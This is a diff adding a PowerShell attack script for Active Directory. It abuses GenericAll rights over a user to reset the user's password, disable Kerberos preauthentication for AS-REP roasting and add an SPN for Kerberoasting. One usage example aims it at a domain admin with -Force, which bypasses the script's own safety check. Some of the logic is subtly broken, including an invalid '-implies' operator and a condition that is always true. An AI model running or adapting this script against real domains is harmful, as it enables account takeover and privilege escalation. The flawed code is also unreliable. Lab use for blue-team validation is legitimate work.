@@ -1,0 +1,347 @@
+<#
+.SYNOPSIS
+Automated attack-playbook to exercise GenericAll over an AD user in a LAB.
+
+.DESCRIPTION
+Pairs with a prior vuln/ACL-abuse script that grants a low-privileged account GenericAll
+over a target user. This script:
+  - Verifies GenericAll on the target.
+  - (Optional) Resets the target's password.
+  - (Optional) Enables/disables "Do not require Kerberos preauthentication" (AS-REP setup).
+  - (Optional) Adds/removes an SPN (Kerberoast setup).
+  - Validates by binding to AD with the new creds.
+  - Supports dry-run by default; requires -Attack to make changes.
+  - Provides -Revert to undo optional changes (preauth/SPN).
+
+!!! For lab/testing and blue-team validation only. !!!
+
+.PARAMETER TargetUser
+SamAccountName of the target user (the one you have GenericAll over).
+
+.PARAMETER NewPassword
+New password to set on the target when using -ResetPassword. If omitted, a random safe password is generated.
+
+.PARAMETER ResetPassword
+Attempt to reset the target's password to NewPassword.
+
+.PARAMETER SetNoPreAuth
+Enable "Do not require Kerberos preauthentication" on the target user (AS-REP roasting setup).
+
+.PARAMETER AddSpn
+Add a service principal name to the target (e.g. "HTTP/web.lab.local" or "MSSQLSvc/sql.lab.local:1433").
+
+.PARAMETER RemoveSpn
+Remove a previously added SPN (use with -Revert or as needed).
+
+.PARAMETER Attack
+Apply changes (without this, the script runs in dry-run mode).
+
+.PARAMETER Revert
+Undo optional changes: re-enable preauth (if disabled) and/or remove SPN specified by -RemoveSpn or -AddSpn.
+
+.PARAMETER Domain
+Optional domain (defaults to current).
+
+.PARAMETER Force
+Bypass guardrails (e.g., if target is a member of "Domain Admins").
+
+.EXAMPLE
+PS> .\invoke_genericall_attack.ps1 -TargetUser "domainadmin" -ResetPassword -NewPassword "Adm!nLab#2025" -Attack -Force
+
+.EXAMPLE
+PS> .\invoke_genericall_attack.ps1 -TargetUser "svc_sql" -SetNoPreAuth -AddSpn "MSSQLSvc/sql.lab.local:1433" -Attack
+
+.EXAMPLE (revert)
+PS> .\invoke_genericall_attack.ps1 -TargetUser "svc_sql" -Revert -RemoveSpn "MSSQLSvc/sql.lab.local:1433" -Attack
+#>
+
+[CmdletBinding(SupportsShouldProcess=$true)]
+param(
+	[Parameter(Mandatory=$true)]
+	[string]$TargetUser,
+
+	[string]$NewPassword,
+
+	[switch]$ResetPassword,
+	[switch]$SetNoPreAuth,
+
+	[string]$AddSpn,
+	[string]$RemoveSpn,
+
+	[switch]$Attack,
+	[switch]$Revert,
+
+	[string]$Domain,
+
+	[switch]$Force
+)
+
+function Write-Info
+{ param([string]$m) Write-Host "[*] $m" -ForegroundColor Cyan 
+}
+function Write-Ok
+{ param([string]$m) Write-Host "[+] $m" -ForegroundColor Green 
+}
+function Write-Warn
+{ param([string]$m) Write-Host "[!] $m" -ForegroundColor Yellow 
+}
+function Write-Bad
+{ param([string]$m) Write-Host "[-] $m" -ForegroundColor Red 
+}
+
+# --- Preconditions ---
+if (-not (Get-Module -ListAvailable -Name ActiveDirectory))
+{ Write-Bad "ActiveDirectory module not found (install RSAT)."; exit 1 
+}
+Import-Module ActiveDirectory
+
+try
+{
+	$Target = Get-ADUser -Identity $TargetUser -Properties memberOf,userAccountControl,servicePrincipalName -ErrorAction Stop
+} catch
+{
+	Write-Bad "Target user '$TargetUser' not found. Make sure your vuln script created it, or create it first."
+	exit 1
+}
+
+# Domain resolve
+if (-not $Domain)
+{
+	try
+	{ $Domain = (Get-ADDomain).DNSRoot 
+	} catch
+	{ $Domain = $null 
+	}
+}
+
+# Guardrail: warn if target is privileged
+$isDA = $false
+try
+{
+	$isDA = ($Target.memberOf -match 'CN=Domain Admins,').Count -gt 0
+} catch
+{ 
+}
+if ($isDA -and -not $Force)
+{
+	Write-Warn "Target is in 'Domain Admins'. Use -Force to proceed. Aborting for safety."
+	exit 1
+}
+
+# --- Verify GenericAll on the target for current caller ---
+function Test-GenericAll
+{
+	param([Microsoft.ActiveDirectory.Management.ADUser]$User)
+	try
+	{
+		$dn = $User.DistinguishedName
+		$de = [ADSI]("LDAP://$dn")
+		$acl = $de.ObjectSecurity
+		$me  = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+		$hits = $acl.Access | Where-Object {
+			($_.IdentityReference -eq $me -or $_.IdentityReference -match "\\$([Regex]::Escape(($me -split '\\')[-1]))$") `
+				-and ($_.ActiveDirectoryRights.ToString() -match 'GenericAll')
+		}
+		return ($hits -ne $null -and $hits.Count -gt 0)
+	} catch
+	{
+		return $false
+	}
+}
+
+if (Test-GenericAll -User $Target)
+{
+	Write-Ok "Confirmed GenericAll over '$($Target.SamAccountName)' for the current principal."
+} else
+{
+	Write-Warn "Could NOT confirm GenericAll for current principal. You may still succeed (ACE may reference a group), but proceed with caution."
+}
+
+# --- Helper: random strong password if not given ---
+function New-RandomPassword
+{
+	param([int]$Length = 20)
+	$chars = @()
+	$chars += ([char[]]"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
+	$chars += ([char[]]"abcdefghijklmnopqrstuvwxyz")
+	$chars += ([char[]]"0123456789")
+	$chars += ([char[]]"!@#$%^&*()_-+=[]{},.<>?")
+	-join (1..$Length | ForEach-Object { $chars | Get-Random })
+}
+
+# --- Actions ---
+$didChange = $false
+$changes = @()
+
+if ($Revert)
+{
+	Write-Info "Revert mode requested. Will undo optional changes."
+}
+
+# 1) Reset Password
+if ($ResetPassword -and -not $Revert)
+{
+	if (-not $NewPassword)
+	{ $NewPassword = New-RandomPassword 
+	}
+	Write-Info "Planned: Reset password for '$($Target.SamAccountName)' to a known value."
+	if ($Attack)
+	{
+		try
+		{
+			Set-ADAccountPassword -Identity $Target.SamAccountName -NewPassword (ConvertTo-SecureString $NewPassword -AsPlainText -Force) -Reset -ErrorAction Stop
+			Write-Ok "Password reset successful."
+			$didChange = $true; $changes += "PasswordReset"
+		} catch
+		{
+			Write-Bad "Password reset failed: $($_.Exception.Message)"
+			exit 1
+		}
+	} else
+	{
+		Write-Warn "Dry-run: would reset password to a generated or provided value."
+	}
+}
+
+# 2) (Re)Configure PreAuth
+if ($SetNoPreAuth -and -not $Revert)
+{
+	Write-Info "Planned: Enable 'Do not require Kerberos preauthentication' (AS-REP setup)."
+	if ($Attack)
+	{
+		try
+		{
+			Set-ADAccountControl -Identity $Target.SamAccountName -DoesNotRequirePreAuth $true -ErrorAction Stop
+			Write-Ok "Preauth disabled (DONT_REQ_PREAUTH set)."
+			$didChange = $true; $changes += "NoPreAuthEnabled"
+		} catch
+		{
+			Write-Bad "Failed to disable preauth: $($_.Exception.Message)"; exit 1
+		}
+	} else
+	{
+		Write-Warn "Dry-run: would disable preauth."
+	}
+}
+
+# 3) Add SPN
+if ($AddSpn -and -not $Revert)
+{
+	Write-Info "Planned: Add SPN '$AddSpn' to '$($Target.SamAccountName)' (Kerberoast setup)."
+	if ($Attack)
+	{
+		try
+		{
+			Set-ADUser -Identity $Target.SamAccountName -Add @{ servicePrincipalName = $AddSpn } -ErrorAction Stop
+			Write-Ok "SPN added: $AddSpn"
+			$didChange = $true; $changes += "SPN+$AddSpn"
+		} catch
+		{
+			Write-Bad "Failed to add SPN: $($_.Exception.Message)"; exit 1
+		}
+	} else
+	{
+		Write-Warn "Dry-run: would add SPN '$AddSpn'."
+	}
+}
+
+# --- Revert optional changes ---
+if ($Revert)
+{
+	$revertOK = $true
+	# Re-enable preauth if previously disabled or requested
+	if ($SetNoPreAuth -or $true)
+	{
+		# Try to re-enable; harmless if already enabled.
+		Write-Info "Revert: re-enabling preauth."
+		if ($Attack)
+		{
+			try
+			{
+				Set-ADAccountControl -Identity $Target.SamAccountName -DoesNotRequirePreAuth $false -ErrorAction Stop
+				Write-Ok "Preauth re-enabled."
+			} catch
+			{ Write-Warn "Could not re-enable preauth (may already be enabled): $($_.Exception.Message)" 
+			}
+		} else
+		{
+			Write-Warn "Dry-run: would re-enable preauth."
+		}
+	}
+	# Remove SPN if specified
+	$spnToRemove = $RemoveSpn
+	if (-not $spnToRemove -and $AddSpn)
+	{ $spnToRemove = $AddSpn 
+	}
+	if ($spnToRemove)
+	{
+		Write-Info "Revert: removing SPN '$spnToRemove'."
+		if ($Attack)
+		{
+			try
+			{
+				Set-ADUser -Identity $Target.SamAccountName -Remove @{ servicePrincipalName = $spnToRemove } -ErrorAction Stop
+				Write-Ok "SPN removed: $spnToRemove"
+			} catch
+			{ Write-Warn "Could not remove SPN (may not be present): $($_.Exception.Message)" 
+			}
+		} else
+		{
+			Write-Warn "Dry-run: would remove SPN '$spnToRemove'."
+		}
+	}
+}
+
+# --- Validation step (only meaningful after password reset) ---
+$validated = $false
+if ($Attack -and $ResetPassword -and -not $Revert)
+{
+	Write-Info "Validating: try simple directory bind as '$($Target.SamAccountName)'."
+	try
+	{
+		$creds = New-Object System.Management.Automation.PSCredential(
+			("{0}\{1}" -f ($Domain ?? $env:USERDOMAIN), $Target.SamAccountName),
+			(ConvertTo-SecureString $NewPassword -AsPlainText -Force)
+		)
+		# A harmless query with the new creds
+		$null = Get-ADUser -Identity $Target.SamAccountName -Credential $creds -ErrorAction Stop
+		Write-Ok "Validation success: authenticated with new credentials."
+		$validated = $true
+	} catch
+	{
+		Write-Warn "Validation failed: could not bind with new credentials. ($($_.Exception.Message))"
+	}
+}
+
+# --- Summary / Exit code ---
+if (-not $Attack)
+{
+	Write-Warn "Dry-run complete. No changes were made. Use -Attack to apply."
+	exit 0
+}
+
+if ($Revert)
+{
+	Write-Ok "Revert path completed."
+	exit 0
+}
+
+if ($didChange -and ($ResetPassword -implies $validated)) {
+	Write-Ok ("Completed actions: {0}" -f ($changes -join ", "))
+	exit 0
+} elseif ($didChange) {
+	Write-Warn ("Some actions applied but validation was inconclusive/failed. Actions: {0}" -f ($changes -join ", "))
+	exit 1
+} else {
+	Write-Bad "No actions were applied."
+	exit 1
+}
+
+# tiny helper for readability
+filter implies
+{ param($a,$b) if($a)
+	{$b
+	} else
+	{$true
+	} 
+}
